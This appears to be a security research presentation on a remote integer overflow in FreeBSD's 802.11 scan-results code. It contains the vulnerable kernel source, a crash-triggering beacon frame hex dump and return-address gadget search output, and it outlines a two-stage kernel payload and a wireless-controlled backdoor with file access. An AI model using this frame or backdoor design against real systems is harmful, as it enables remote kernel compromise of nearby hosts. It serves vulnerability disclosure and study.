### FreeBSD 802.11 Remote Integer Overflow

#### Code for Function Called by `ioctl[SCAN_RESULTS]` (Part 2/3)

```c
/* XXX locking */
struct ieee80211_node_table *nt = &ic->ic_scan;
TAILQ_FOREACH(struct ieee80211_node *ni, &nt->nt_node, ni_list) {
    /* Skip pre-scan node state */
    if (ni->ni_chan == IEEE80211_CHAN_ANYC)
        continue;

    get_scan_result(sr, ni);  // Calculate `isr_len` and other struct variables
    if (sr->isr_len > sizeof(u))
        continue;

    /* XXX */
    if (space < sr->isr_len)
        break;

    u_int8_t *cp = (u_int8_t *)(sr + 1);
    memcpy(cp, ni->ni_essid, ni->ni_esslen);  // Copy to stack space of union `u`
    cp += ni->ni_esslen;
}
```

#### Code for Function Called by `ioctl[SCAN_RESULTS]` (Part 3/3)

```c
if (ni->ni_wpa_ie != NULL) {
    memcpy(cp, ni->ni_wpa_ie, 2 + ni->ni_wpa_ie[1]);  // Copy to union `u`
    cp += 2 + ni->ni_wpa_ie[1];
}

if (ni->ni_wme_ie != NULL) {
    memcpy(cp, ni->ni_wme_ie, 2 + ni->ni_wme_ie[1]);  // Copy to union `u`
    cp += 2 + ni->ni_wme_ie[1];
}

error = copyout(sr, p, sr->isr_len);
if (error)
    break;

p += sr->isr_len;
space -= sr->isr_len;
}

ireq->i_len -= space;
return error;
```

#### Function `get_scan_result`

```c
static void
get_scan_result(struct ieee80211req_scan_result *sr, const struct ieee80211_node *ni)
{
    struct ieee80211com *ic = ni->ni_ic;
    memset(sr, 0, sizeof(*sr));
    sr->isr_ssid_len = ni->ni_esslen;

    if (ni->ni_wpa_ie != NULL)
        sr->isr_ie_len += 2 + ni->ni_wpa_ie[1];

    if (ni->ni_wme_ie != NULL)
        sr->isr_ie_len += 2 + ni->ni_wme_ie[1];  // Note: `isr_ie_len` is a uint8_t!!!

    sr->isr_len = sizeof(*sr) + sr->isr_ssid_len + sr->isr_ie_len;
    sr->isr_len = roundup(sr->isr_len, sizeof(u_int32_t));

    if (ni->ni_chan != IEEE80211_CHAN_ANYC) {
        sr->isr_freq = ni->ni_chan->ic_freq;
        sr->isr_flags = ni->ni_chan->ic_flags;
    }
    // Additional code...
}
```

### Testing the Vulnerability

- **Hardcode Test Case into Kernel**
  - Create a custom kernel with debugging facilities.
  - Modify kernel configuration:
    ```sh
    makeoptions     DEBUG=-g 
    options         GDB
    options         DDB # optional
    options         KDB
    ```
  - Recompile and reboot.
  - Ensure DDB is enabled:
    ```sh
    sysctl –w debug.kdb.current=ddb
    ```

- **Trigger the Affected Code**
  - Use `ifconfig` to trigger the affected code.
  - Example output:
    ```sh
    Fatal trap 12: page fault while in kernel mode
    fault virtual address   = 0x41414155
    fault code              = supervisor write, page not present
    instruction pointer     = 0x20:0xc06c405c
    stack pointer           = 0x28:0xd0c5e938
    frame pointer           = 0x28:0xd0c5eb4c
    code segment            = base 0x0, limit 0xfffff, type 0x1b
                            = DPL 0, pres 1, def32 1, gran 1
    processor eflags        = interrupt enabled, resume, IOPL = 0
    current process         = 203 (ifconfig)
    [thread pid 203 tid 100058 ]
    Stopped at      ieee80211_ioctl_getscanresults+0x120:   subw   %dx,0x14(%eax)
    ```

- **Remote Triggering**
  - The `wpa_supplicant` regularly calls this `ioctl`.
  - `wpa_supplicant` is included in the base distribution and is needed for 802.1X authentication (WPA-PSK).
  - Send raw frames using BPF in NetBSD, which has been extended to send arbitrary IEEE 802.11 frames.

### Debugging Environment

- **Switch to GDB**
  - Configure the kernel to allow kernel debugging:
    - In `/boot/device.hints`:
      ```sh
      hint.sio.0.flags="0x80"
      ```
    - Switch the default debugger:
      ```sh
      sysctl –w debug.kdb.current=gdb
      ```
    - Refer to the documentation for more details:
      ```sh
      http://www.freebsd.org/doc/en_US.ISO8859-1/books/developers-handbook/kerneldebug.html
      ```

### Preparing and Sending a Beacon Frame

- **Prepare a Beacon Frame with Large SSID, WPA, and WME Fields**
  - Example beacon frame:
    ```sh
    16:32:33.155795 0us BSSID:cc:cc:cc:cc:cc:cc DA:ff:ff:ff:ff:ff:ff SA:cc:cc:cc:cc:cc:cc Beacon (XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX) [1.0* 2.0* 5.5 11.0 Mbit] ESS CH: 1
    0x0000:  ceef f382 c40b 0000 6400 0100 0020 5858  ........d.....XX
    0x0010:  5858 5858 5858 5858 5858 5858 5858 5858  XXXXXXXXXXXXXXXX
    0x0020:  5858 5858 5858 5858 5858 5858 5858 0104  XXXXXXXXXXXXXX..
    0x0030:  8284 0b16 0301 01dd fc00 50f2 0141 4141  ..........P..AAA
    0x0040:  4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
    ...
    0x0120:  4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
    0x0130:  4141 4141 41dd fd00 50f2 0201 4141 4141  AAAAA...P...AAAA
    0x0140:  4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
    ...
    0x0220:  4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
    0x0230:  4141 4141                                AAAA
    ```

- **On Target When Frame is Sent**
  - Example GDB output:
    ```sh
    [New Thread 100058]
    Program received signal SIGSEGV, Segmentation fault.
    [Switching to Thread 100058]
    0xc06c405c in ieee80211_ioctl_getscanresults (ic=0x41414141, ireq=0x41414141)
        at ../../../net80211/ieee80211_ioctl.c:1047
    1047            ireq->i_len -= space;
    ```

### Overwriting the Return Address

- **Overwrite the Return Address**
  - Search for a suitable address to jump to, such as `jmp *%esp`:
    ```sh
    $ search_instr.py  -s 0x003d4518 -f 0x00043c30 -v 0xc0443c30 FreeBSD_GENERIC_i386_6.0
    0xc044dd3d: 0xff 0xe4, jmp *%esp
    ```

- **Initial Payload**
  - Limited to 32 bytes to avoid overwriting important data.
  - Stage a second payload that resides in the received beacon frame (in a kernel list).

- **Second Stage Payload**
  - Allocate memory for the backdoor.
  - Copy the head of the backdoor to the allocated area.
  - Save the original management-frame handler function pointer.
  - Overwrite the original handler with a pointer to the backdoor.
  - Restore the stack frame two levels up before returning.
  - Return an empty scan list and no error.

### Backdoor Implementation

- **Backdoor in Place**
  - The backdoor function receives all management frames.
  - Look for a magic number at a fixed position within the WPA IE field.
  - If the magic number is found, initialize the backdoor.
  - If no magic number is found, pass the frame to the real handler.

- **Backdoor Command Types**
  - **Ping Backdoor**
    - Every ping has a unique 32-bit identifier.
    - Send back a pong response including the identifier.
  - **Upload Backdoor-Code**
    - Each upload has a 16-bit offset and 251 bytes of possible data.
    - Send back an ACK response with the ACK'd offset.
  - **Execute Backdoor-Code**
    - All commands have a variable argument data field.
    - Send back the execution result.

- **Fileserver Plugin**
  - Read file in 128-byte chunks.
  - Stat file to get state information.
  - Write (and possibly create) file in 128-byte chunks.

- **File System Operations**
  - Extract essential functions required for operations.
  - Initialize a `struct nameidata` as the `NDINIT()` macro does.
  - Ensure the current thread's process has a working directory.
  - Lookup vnode with `vn_open()`.
  - Perform read with `vn_rdwr()`.
  - Unlock and close vnode using `VOP_UNLOCK_APV()` and `vn_close()`.

### Conclusion

- **Final Thoughts**
  - The Net80211 framework in *BSD is a significant work and deserves credit for its contributions.
  - However, it may need some cleaning up and security auditing to address potential vulnerabilities like the one described here.

- **Demonstration**
  - Further details and demonstrations can be provided to illustrate the vulnerability and its exploitation.